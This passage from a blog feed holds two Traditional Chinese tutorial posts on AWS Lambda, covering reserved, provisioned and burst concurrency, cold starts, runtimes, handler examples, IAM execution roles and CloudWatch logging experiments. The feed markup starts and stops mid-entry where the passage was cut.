      
      
        <tags>
            
            <tag> Lambda </tag>
            
            <tag> AWS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS Lambda知識整理 | 佈建並行 | 預留並行</title>
      <link href="/posts/a09fae.html"/>
      <url>/posts/a09fae.html</url>
      
        <content type="html"><![CDATA[<h2 id="回顧"><a href="#回顧" class="headerlink" title="回顧"></a>回顧</h2><p>前面有提及了 Lambda 的基本介紹、Lambda Runtime、權限配置 以及從日誌上觀察初始化時間以及函數執行時間。</p><p>最後我們有提到一個問題，那就是</p><blockquote><p>如果我們用 AWS CLI 去調用 Lambda 函數，用 Terminal 一次開三個Tab同時調用我們的 Lambda 函數會發生什麼事？</p></blockquote><h2 id="實驗一-設置-Reserved-Concurrency"><a href="#實驗一-設置-Reserved-Concurrency" class="headerlink" title="實驗一 - 設置 Reserved Concurrency"></a>實驗一 - 設置 Reserved Concurrency</h2><p>我們執行以下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">    --function-name TestInvocations \</span><br><span class="line">    --cli-binary-format raw-in-base64-out \</span><br><span class="line">    --payload &#x27;&#123; &quot;name&quot;: &quot;test&quot; &#125;&#x27; \</span><br><span class="line">    response.json</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/ry_jkJsRn.png"></p><p>事實上他都可以成功，並且會在 CloudWatch 上產生三筆Log Stream。 </p><p><img src="https://hackmd.io/_uploads/SJ64-1iCn.png"></p><p>但如果我們去設定動一點手腳，我們將某個叫做 <strong>Reserved Concurrency</strong> 的設定調整成1，並按下 saved。並且重新透過 CLI 執行調用的指令，看會發生什麼事。</p><p><img src="https://hackmd.io/_uploads/Sk6GZJsCn.png"></p><p>這時候會發現，只有一個請求成功回傳200，其他都被 Throttled。會回傳 <code>TooManyRequestsException</code> 的錯誤訓息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An error occurred (TooManyRequestsException) when calling the Invoke operation</span><br></pre></td></tr></table></figure><p>這必須提到 Lambda 應對同時間大量請求的處理機制。</p><blockquote><p>首先，什麼是 Reserved Concurrency? 什麼又是 Unresereved Concurrency?</p></blockquote><h2 id="預留並行-Reserved-Concurrency"><a href="#預留並行-Reserved-Concurrency" class="headerlink" title="預留並行(Reserved Concurrency)"></a>預留並行(Reserved Concurrency)</h2><p>談到 Concurrency，中文叫做並行或併發。這代表什麼？這代表同一時間的多個請求。為了應對這同時來臨的請求，Lambda 函數會去自動擴展。 Serverless 到好處就是，你不需要考量該如何為 Lambda 設置擴展，像是怎麼設定 auto-scaling 的功能。</p><p>在 Lambda 當中，對於同一個函數，使用者只需要考量「<strong>對於這個Lambda 函數，你會需要隨時為它保留多少數量的執行個體？</strong></p><p>這時，你就可以考慮為你的函數設定 Reserved Concurrency。</p><p>預留並行是要分配給函數的並行執行個體數量上限。當某個函數具有預留並行時，其他函數都無法使用該並行。</p><p><strong>如果你在 Lambda 主控台上設定 Reserved Concurrency為 1，就會從 Unreserved Concurrency 當中扣除掉 1</strong>。</p><p>而這個設定是區域型的限制 (Regional)，若你為某個函數設定Resevered Concurrecny 為 100 那剩下的 900 就會是由區域內其他函數共用。</p><blockquote><p>可以為一個函數保留多少數量的 Concurrency?</p></blockquote><p>答案會是， <code>UnreservedConcurrency - 100</code> 數量的並行。<br>也就是說一個函數不可以獨佔所有的並行僅為這個函數來執行，起碼會留下 100 個並行數量給其他函數共用。</p><blockquote><p>你要如何決定你的函數改保留多少並行？</p></blockquote><p>你可以透鍋觀察 CloudWatch 指標 <code>ConcurrentExecutions</code> 來決定 [1]。 這個指標可以觀察到對於你的函數而言，一天下來不同時間段的並行請求數量，假設這個函數一天一次最多會有 30個請求進來，並且這個函數對你很重要，那就可以考慮保留 30 個 Lambda 執行個體來處理請求。</p><blockquote><p>另外值得一提的是，設定函數的預留並行不會收費</p></blockquote><h2 id="佈建並行-（Provision-Conccurency）"><a href="#佈建並行-（Provision-Conccurency）" class="headerlink" title="佈建並行 （Provision Conccurency）"></a>佈建並行 （Provision Conccurency）</h2><p>可能會有人好奇，如果函數會根據請求擴展，那啟動新的執行環境，這樣對於 time-sensitive 的請求來說，延遲不會很久嗎？</p><p><img src="https://hackmd.io/_uploads/ByoYHrrkp.png"></p><blockquote><p>圖片來源： AWS 官網</p></blockquote><p>這個想法沒錯，可以看到上圖的數字4，就是這樣的狀況。</p><p>這代表 3 個執行環境在處理 3 個請求，但第4個請求出來時，就必須初始化一個新的 Lambda 執行環境。 這樣就勢必有延遲，需要等待 Runtime 啟動，下載 Lambda code 和 dependency，以及去執行 Handler 以外的程式區塊（如果有的話）。</p><p>佈建並行的意義在於 <strong>「為函數預先初始化多個環境執行個體，有助於縮短冷啟動延遲」</strong></p><p><strong>冷啟動延遲 （Cold Start）</strong> 就是 Lambda 執行環境在啟動載入時，這段不可控的延遲時間（不包含 Function Init, 也就是執行 handler 程式外區段的初始化時間）。這部分我們會在後面提到。</p><p>回到 Provision Concurrency，所以如果設定了 Provision Concurrency，圖片比較會類似下面。</p><p>假設 Provision Concurrency 設成4。 那一開始就會有四個 Lambda 執行環境進行初始化。並且後續的請求都會重用那四個 Lambda 環境，也就是說當這裡就保證了一定會有 4個初始化過的 Lambda 環境存在，對於時間敏感度高的請求，就比較適合設定這個功能，才不用再度收到初始化的延遲影響。</p><p><img src="https://hackmd.io/_uploads/rJ1GiHSJT.png"></p><p>那要怎麼設定 Provision Concurrency 呢？[2]</p><blockquote><p>提醒：為函數設定 Provision Concurrency 是要收費的</p></blockquote><h2 id="實驗二-設置-Provision-Concurrency"><a href="#實驗二-設置-Provision-Concurrency" class="headerlink" title="實驗二 - 設置 Provision Concurrency"></a>實驗二 - 設置 Provision Concurrency</h2><p>在設定 Provision Concurrency之前有個前置作業要做，也就是<strong>發布你的函數版本</strong>。</p><p>每個函數在發布版本之前的預設都是： <strong>$LATEST</strong>，但 Provision Concurrency 並不能設定在 $LATEST 版本的函數上面，這是一個限制。</p><p>可以先在主頁中的 <strong>Version</strong> 找到 <strong>Publish new version</strong><br><img src="https://hackmd.io/_uploads/H1khZIrya.png"></p><p>接著可以填入這個版本的敘述，然後按下 Publish<br><img src="https://hackmd.io/_uploads/By2C-UH1T.png"></p><p>之後就會調轉到 Version 1 的 Lambda函數主控台 （與 $LATEST 函數主控台略微不同）。這時應該會看到 Provision Concurrency 的設定畫面，點選後就可以為 Version 1 的函數設定並行。</p><p><img src="https://hackmd.io/_uploads/Bk4KM8r1T.png"></p><p>下方可以填入你想要維持 warm start 狀態的 Lambda 並行數量。<br>底下可以注意到 “10 available”。這個數字是哪來的呢？</p><p>其實這個數字就是你函數的 <strong>Reserved Concurrency 的數量</strong></p><p>可以回到 $LATEST 版本的函數主控台畫面。</p><p><img src="https://hackmd.io/_uploads/SJMrmLSyp.png"></p><p>底下可以看到我們設定數量就是 10。<br><img src="https://hackmd.io/_uploads/B1OLmIBJp.png"></p><blockquote><p><strong>因此我們可以設定佈建並行的數量，是取決於你為該函數設定的保留並行數量</strong></p></blockquote><p>我們這裡將佈建並行數量設定成 5。</p><p><img src="https://hackmd.io/_uploads/SkPZV8S1T.png"></p><p>之後會需要點時間來建立並行。</p><p>接著我們來測試設定的 Provision Concurrency。</p><p>首先，以下是測試用的 code (在version1 函數當中的程式碼)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, time</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sleep for 3 secs&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我們通過 AWS CLI 來去觸發 Lambda 函數</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda invoke \</span><br><span class="line">--function-name TestInvocations \</span><br><span class="line">--cli-binary-format raw-in-base64-out \</span><br><span class="line">--qualifier 1 \</span><br><span class="line">--payload &#x27;&#123; &quot;key&quot;: &quot;value&quot; &#125;&#x27; </span><br><span class="line">response.json</span><br></pre></td></tr></table></figure><p>在 <code>--qualifier</code> 參數後面接的是版本名稱或者是 Alias 名稱。</p><p>可以先暫停，在實際觸發錢先去觀察 CloudWatch 上的觸發日誌</p><p><img src="https://hackmd.io/_uploads/ryTU7dBJ6.png"></p><p>會發現有多個執行環境已經先預熱完成了</p><blockquote><p>至於數量為何大於 Provision Concurrency 數量這點尚未確定<br>可能是為了可用性？</p></blockquote><p>在開多個終端送請求後，可以發現一樣，因為執行環境已經預熱好，因此不需要重新 Init，可以基於 Container-Reuse 的特性來在現有的執行環境執行請求。</p><p><img src="https://hackmd.io/_uploads/rkdt4urya.png"></p><h2 id="Reserved-Concurrency-vs-Provison-Concurrency"><a href="#Reserved-Concurrency-vs-Provison-Concurrency" class="headerlink" title="Reserved Concurrency vs. Provison Concurrency"></a>Reserved Concurrency vs. Provison Concurrency</h2><p><img src="https://hackmd.io/_uploads/B1BXrdB1a.png"></p><blockquote><p>圖片來源： <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#reserved-and-provisioned</a></p></blockquote><p>用官方展示一張對比圖來解釋這兩種並行的差異。</p><p>以下是我整理這兩種並行的差異</p><table><thead><tr><th></th><th>RC(Reserved Concurrency)</th><th>PC(Provision Concurrency)</th></tr></thead><tbody><tr><td>費用:</td><td>不用收費</td><td>要收費</td></tr><tr><td>特性：</td><td>確保一定數量的Lambda執行環境存在</td><td>確保一定數量的Lambda執行環境存在且這當中有一定數量的執行環境已經初始化過了</td></tr><tr><td>達到limit的反應</td><td>Throtteld <code>TooManyRequest</code></td><td>若還有RC額度，則會擴增執行環境個數，但一樣會有冷啟動，沒有額度則 Throttled</td></tr></tbody></table><blockquote><p>也請參考官方的差異表格 [3]</p></blockquote><h2 id="暴增並行"><a href="#暴增並行" class="headerlink" title="暴增並行"></a>暴增並行</h2><p>所謂的暴增並行（Burst Concurrency），目的也是為了能夠應付突然暴增的請求。</p><p>但面對突然增加的大量請求，Lambda 可能也沒辦法立即擴展來處理，這是為了防止 Lambda 函數過度擴展消耗太多資源。</p><p>所以在因應函數暴增的速度，可以通過設定暴增並行來去增加建立 Lambda 執行環境的最高速度。而這個設定是 Account-Level 的設定。</p><p>但在不同 Region，暴增並行有上限的差異：</p><ul><li><code>us-west-2</code>, <code>us-east-1</code> 以及 <code>eu-west-1</code>的 Region 基本上是上限都是 3000</li><li><code>ap-northeast-1</code>, <code>eu-central-1</code> 還有 <code>us-east-2</code> Region 上限是 1000</li><li>其他 Region 都是 500</li></ul><p>以 us-east-1 為例，暴增並行每分鐘擴展 500 個單位的暴增擴展（額外的 Lambda 執行環境），直到達到需求或者是達到上限 3000個。</p><p>超出上限的請求會被 Throttled (Status Code: 429)</p><p>有興趣的可以直接看官方文件針對暴增並行的介紹 [5]。</p><h2 id="冷啟動-（Cold-Start）"><a href="#冷啟動-（Cold-Start）" class="headerlink" title="冷啟動 （Cold Start）"></a>冷啟動 （Cold Start）</h2><blockquote><p>Lambda 在 Init 階段做了哪些事情</p></blockquote><ul><li>當 Lambda 服務透過 Lambda API 收到啟動 Lambda 函數的請求時服務本身會去下載函數程式碼。</li><li>這個程式碼會存放在 Lambda 內部的 S3 bucket當中</li><li>如果是用函數是用容器建立，則函數程式碼會放在 <strong>Amazon ECR</strong> 上</li><li>接著會去建立具有指定記憶體大小以及指定 Runtime 的環境 </li><li>接著會去執行 函數 Hander之外的初始化程式</li></ul><p>根據 [4]，可以知道上面的步驟除了執行函數初始化程式外，都屬於 Cold Start 的範圍。而執行函數 handler 外的程式碼就算是 warm start，也就是我們可以控制的範圍了。</p><blockquote><p>函數又是怎麼能夠一直保持是 “warm”的？</p></blockquote><p>官方文件說明是通過一種 <strong>pinging mechanism</strong>。主要實踐方式是透過設定 <strong>Eventbridge</strong> 的規則安排每分鐘調用一次函數來幫助函數執行環境保持活躍，</p><p>減緩冷啟動的方式，目前推薦的還是藉由設定 Provision Concurrency。<br>另外還有 <strong>Snapstart</strong>，這個我們可以留到後面繼續介紹～</p><h2 id="參考文件"><a href="#參考文件" class="headerlink" title="參考文件"></a>參考文件</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/configuration-concurrency.html#estimating-reserved-concurrency</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/provisioned-concurrency.html</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-concurrency.html#comparing-reserved-provisioned</a><br>[4] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency">https://docs.aws.amazon.com/zh_tw/lambda/latest/operatorguide/execution-environments.html#cold-start-latency</a><br>[5]<a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/burst-concurrency.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lambda </tag>
            
            <tag> AWS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lambda 基本認識 feat.容器重用小實驗</title>
      <link href="/posts/c79cef2b.html"/>
      <url>/posts/c79cef2b.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，為什麼談到無伺服器總是會有人提到 Lambda ?</p><p>以下就開始來介紹這個服務</p><h2 id="FaaS-Function-as-a-Service"><a href="#FaaS-Function-as-a-Service" class="headerlink" title="FaaS (Function as a Service)"></a>FaaS (Function as a Service)</h2><p>一旦談到無伺服器運算，就會提到他的核心概念，<strong>功能即服務(Function as a Service)</strong> ，這裡引用維基百科對於 FaaS 的解釋</p><blockquote><p>FaaS 是雲端運算的一種模型。以平台即服務（PaaS）為基礎，無伺服器運算提供一個微型的架構，終端客戶不需要部署、配置或管理伺服器服務，程式碼運行所需要的伺服器服務皆由雲端平台來提供。</p></blockquote><p>沒錯，這個概念的核心就是讓使用者專注在設計產品或業務邏輯，而不需費心在部署配置或是設定伺服器。</p><p>而最早實踐這個概念並推出服務的，就是 AWS 在 2014 年推出的 Lambda 服務。（當然後續也有 Microsoft 的 Azure Function）</p><h2 id="Lambda-函數"><a href="#Lambda-函數" class="headerlink" title="Lambda 函數"></a>Lambda 函數</h2><blockquote><p>Lambda 在高可用性的運算基礎設施上執行您的程式碼，並執行所有運算資源的管理，包括伺服器與作業系統維護、容量佈建與自動擴展以及記錄。使用 Lambda，您唯一需要做的就是在 Lambda 支援的其中一種語言執行期中提供您的程式碼 [1]。[name&#x3D;AWS Documents] </p></blockquote><p>以行為上來看基本上就是，我底下的這張圖。會有某個上游的觸發器（Trigger），通常是某種服務來去調用 Lambda 函數，或者是手動透過AWS CLI 的方式調用。 Lambda 執行函數完畢後將執行結果回傳給原服務，並且可以將觸發下游的目的地（ Destination）這通常也是某個服務。</p><p><img src="https://hackmd.io/_uploads/SyPe6nOC2.png"></p><p>現在假設你是一個新手，剛接觸 Lambda 你可能會急著想要打開你的 Console ，用範例程式，或者有些人範例程式寫什麼都不看就刪掉，直接複製貼上本地程式，然後透過預設的 Event 來去測試你的 Lambda 函數，然後發現跑不動….</p><p>請別急，在動手前最好先有 Lambda Runtime 以及 Lambda 程式的概念。</p><h2 id="基本規格"><a href="#基本規格" class="headerlink" title="基本規格"></a>基本規格</h2><ul><li>RAM</li><li>Storage</li></ul><h3 id="設置-RAM"><a href="#設置-RAM" class="headerlink" title="設置 - RAM"></a>設置 - RAM</h3><p>RAM 與 CPU 處理效能成正比，可以透過提升 RAM 來連帶提升CPU處理速度<br>    128MB to 3008MB</p><blockquote><p>參考來源:<br><a href="https://koding.work/aws-lambda-performance-is-related-to-memory-size/">https://koding.work/aws-lambda-performance-is-related-to-memory-size/</a></p></blockquote><h2 id="Lambda-Runtimes"><a href="#Lambda-Runtimes" class="headerlink" title="Lambda Runtimes"></a>Lambda Runtimes</h2><p>Lambda 通過使用 Runtime 來支援多種程式語言開發。每個主要的程式設計語言版本都有獨立的 Runtimes。 而這些 Runtime 提供了基本的程式語言的函式庫以及執行環境。</p><p>主流語言都有官方支援的 Runtime 像是 NodeJS, Python, Java, Go, Ruby 等等，並且也支援你去自定義 Runtime。<a href="https://github.com/awslabs/aws-lambda-cpp">像是 C++ Runtime</a>，官方也有提供 Github 和 Post 去寫怎麼使用這種自定義的 Runtimes [3]</p><blockquote><p>小弟就有自定義過 Perl Runtime，但會需要自寫 images..:(</p></blockquote><p>另外， Lambda Runtime 其實都是基於 Amazon Linux 進行開發的。所以基本上如果有自定義 Runtime 的需求，建議都是開個 t2.micro 的 EC2 (選擇 Amazon Linux 相關的 AMI )再來去建構 Runtime。 </p><h2 id="Lambda-程式設計模型"><a href="#Lambda-程式設計模型" class="headerlink" title="Lambda 程式設計模型"></a>Lambda 程式設計模型</h2><p>Lambda 提供的程式設計模型對於所有 Runtime 通用。程式設計模型會定義一個 Handler 來去處理進來的事件。這個做法其實就是將函數的進入點告知 Lambda。執行時間會將包含呼叫事件和內容的物件傳入至 Handler，例如函數名稱和 Request ID。</p><p>如果你建立不同 Runtime 的 Function，應該會在主控台的程式碼區塊上看到不同語言 Handler。</p><p>Handler (Python)[4]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def handler_name(event, context): </span><br><span class="line">    ...</span><br><span class="line">    return some_value</span><br></pre></td></tr></table></figure><p>Handler (Java17)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package example;</span><br><span class="line"></span><br><span class="line">import com.amazonaws.services.lambda.runtime.Context;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.LambdaLogger;</span><br><span class="line">import com.amazonaws.services.lambda.runtime.RequestHandler;</span><br><span class="line"></span><br><span class="line">// Handler value: example.HandlerInteger</span><br><span class="line">public class HandlerIntegerJava17 implements RequestHandler&lt;IntegerRecord, Integer&gt;&#123;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  /*</span><br><span class="line">   * Takes in an InputRecord, which contains two integers and a String.</span><br><span class="line">   * Logs the String, then returns the sum of the two Integers.</span><br><span class="line">   */</span><br><span class="line">  public Integer handleRequest(IntegerRecord event, Context context)</span><br><span class="line">  &#123;</span><br><span class="line">    LambdaLogger logger = context.getLogger();</span><br><span class="line">    logger.log(&quot;String found: &quot; + event.message());</span><br><span class="line">    return event.x() + event.y();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record IntegerRecord(int x, int y, String message) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Handler (Go)    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">        &quot;fmt&quot;</span><br><span class="line">        &quot;context&quot;</span><br><span class="line">        &quot;github.com/aws/aws-lambda-go/lambda&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type MyEvent struct &#123;</span><br><span class="line">        Name string `json:&quot;name&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func HandleRequest(ctx context.Context, name MyEvent) (string, error) &#123;</span><br><span class="line">        return fmt.Sprintf(&quot;Hello %s!&quot;, name.Name ), nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        lambda.Start(HandleRequest)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>諸如此類。</p><p>另外，由於剛創建 Lambda 的時候僅會有 Lambder-Handler一個檔案，但其實可以存取在 Lambda 執行環境當中的 <code>/tmp</code> 目錄 ，每個執行環境都會在 <code>/tmp</code> 目錄中提供 512 MB 到 10,240 MB 的磁碟空間，增量為 1 MB [5]。具體而言可以等之後談到 Lambda 執行環境的生命週期再說。</p><h2 id="權限"><a href="#權限" class="headerlink" title="權限"></a>權限</h2><p>Lambda 當中主要是透過執行角色（Execution Role）來去代替來源服務去執行操作。</p><p>那什麼是 Lambda 執行角色？</p><blockquote><p>Lambda 函數的執行角色是 AWS IAM 角色，它可授予函數存取 AWS 服務和資源的許可。例如，您可以建立一個執行角色，該角色有權向 Amazon CloudWatch 傳送日誌並向 AWS X-Ray 上傳追蹤資料。本頁提供有關如何建立、檢視和管理 Lambda 函數執行角色的資訊 [6]。</p></blockquote><p>執行角色跟一般角色最大的不同就是，當調用函數時，<strong>Lambda 會透過擔任此角色自動為您的函數提供臨時憑證</strong>。開發者不必在函數程式碼中呼叫 <code>sts:AssumeRole</code></p><p>而需要做到這點的必要設置，就是要設定角色的信任政策(Trust Policy)，這當中就必須將 Lambda 服務指定為受信任的主體</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Principal&quot;: &#123;</span><br><span class="line">        &quot;Service&quot;: &quot;lambda.amazonaws.com&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;Action&quot;: &quot;sts:AssumeRole&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦有了執行角色，就可以去為這個角色附加政策，可以使用 AWS 管理的政策或者是自己定義政策</p><p><img src="https://hackmd.io/_uploads/ryyPLT9Rn.png"></p><p>當然，若你在建立 Lambda 的時候選擇 “Create a new role with basic Lambda permissions”，就會去建立一個帶有 <code>LambdaBasicExecutionRole</code> 的政策。</p><p><img src="https://hackmd.io/_uploads/HkTcIpcCh.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot; : &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot; : [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot; : &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot; : [</span><br><span class="line">        &quot;logs:CreateLogGroup&quot;,</span><br><span class="line">        &quot;logs:CreateLogStream&quot;,</span><br><span class="line">        &quot;logs:PutLogEvents&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot; : &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這個政策基本上就是給予 Lambda 函數能夠建立Log Group 並且能夠在Log Group 中建立 Log Stream 然後寫入日誌的功能。</p><p>當調用 Lambda的時候，會在 CloudWatch 建立包含 Lambda 名稱的Log Group，假設今天我的 Lambda 名稱叫做 <strong>TestInvocations</strong> 那日誌組的名稱就會是 <code>/aws/lambda/TestInvocations</code></p><p><img src="https://hackmd.io/_uploads/HyaWdT50h.png"></p><p>而底下就會有對應的 Log Stream</p><p><img src="https://hackmd.io/_uploads/ryBDOaqRh.png"></p><p>這裡有個有意思的地方，就是每次如果對函數進行更動或是做一些設定上的調整(Ex. 改變 Timeout 時間) 下一次調用就會產生新的 Log Stream。</p><p>因為每當你做一次新的設置，就會需要將你的設定套用到新的Sanbox 環境，也就會重新初始化新的一個 Lambda 執行環境。</p><p>如果點開 Log Stream，會發現每一次 Invocation  都會伴隨著不同的 Message，分別是：</p><ul><li>START</li><li>(Print Output, if there are any)</li><li>END</li><li>REPORT</li></ul><p>Start 到 End 這段期間代表 Lambda 正在執行，這段時間的 TimeStamp 差值也受限於你在 Lambda 上面的 Timeout 設定，可以先針對這點來做個小實驗。</p><p><img src="https://hackmd.io/_uploads/S1KPKa502.png"></p><h3 id="實驗一-Lambda-Timeout"><a href="#實驗一-Lambda-Timeout" class="headerlink" title="實驗一: Lambda Timeout"></a>實驗一: Lambda Timeout</h3><p>建立 Lambda 函數名為 <code>TestInvocation</code>, Runtimes 這裡選擇 <code>Python3.11</code>, 權限就維持預設。之後到 Lambda 主控台底下的 <strong>Code</strong> 區域編輯程式。</p><p><img src="https://hackmd.io/_uploads/SyEhzRqAh.png"></p><p>建立好 Lambda 後會給個空的 Lambda Handler，我們在這裡多 import time 並且在 handler 裏面延遲 3秒。接著按下 Test，這當中會有測試用的 JSON event，可以直接用來測試。</p><p>測試完畢後可以去 Monitor 頁面點選 “View CloudWatch logs”</p><p><img src="https://hackmd.io/_uploads/S1KUXRcRh.png"></p><p>就會跳去CloudWatch 當中對應的 Log Group，點選TimeStamp最新的 Log Stream，觀察實驗結果。</p><p><img src="https://hackmd.io/_uploads/SyeGfA90h.png"></p><p>可以發現在 Start 以及 End 中間間隔 3 秒，並且有印出 “sleep for 3 seconds”。</p><p>眼尖的人可以看到其中一個 log entry後面有顯示 “Task timed out after 3 seconds”。這是因為剛建立的 Lambda 函數，默認執行時間的timeout值會是3秒。這個可以去 Lambda 主控台上的 “Configuration” 上面修改。<br><img src="https://hackmd.io/_uploads/ry5BERqC3.png"></p><p>Timeout值的最上限會是 15分鐘。所以我們開個 15 分鐘看看，並且將 handler 當中的 delay 也調成大概 14 分鐘左右測試看看。</p><blockquote><p>這是個硬限制，也就是說你沒辦法開 Support Case 去提高額度 [8]</p></blockquote><p>等待 14分鐘過去後，可以從日誌上看到確實執行了 14分鐘<br><img src="https://hackmd.io/_uploads/H1BAq05Rn.png"></p><p>另外在先前的日誌截圖中，沒提到的是 INIT_START，這是每次初始化一個執行環境後就會有的初始化階段，初始化階段包含了 Extension Init、Runtime Init、Function Init [7]</p><p><img src="https://hackmd.io/_uploads/SkQK36qC3.png"><br><em>引用AWS 官方的圖片</em></p><p>前兩個 Init 階段偏向建立執行環境，以及啟動 Runtimes 還有下載deployment package 到執行環境等等，但到了 Function init 階段。這時候還會做一件事情，那就是會<strong>去執行 Lambda Handler 以外的程式</strong>。</p><p><img src="https://hackmd.io/_uploads/ryzXbC9Rn.png"></p><p>這裡在 handler 之外</p><p><img src="https://hackmd.io/_uploads/BJm-Z0qCn.png"></p><p>這麼說有點模糊。假設你宣告了一個全域變數在 Handler 之外，或者是你在 Lambda Handler外去與DB初始化一個連線。這些都很適合放在 Handler 之外做，並且會在 <strong>Init-Start</strong> 到 <strong>Start</strong> 這段期間執行，並且只要是持續使用相同的執行環境，那 Function Init 當中做的事也僅會做一次，這裡就會待到 Lambda 的一個特性，叫做 Container Reuse。  </p><h3 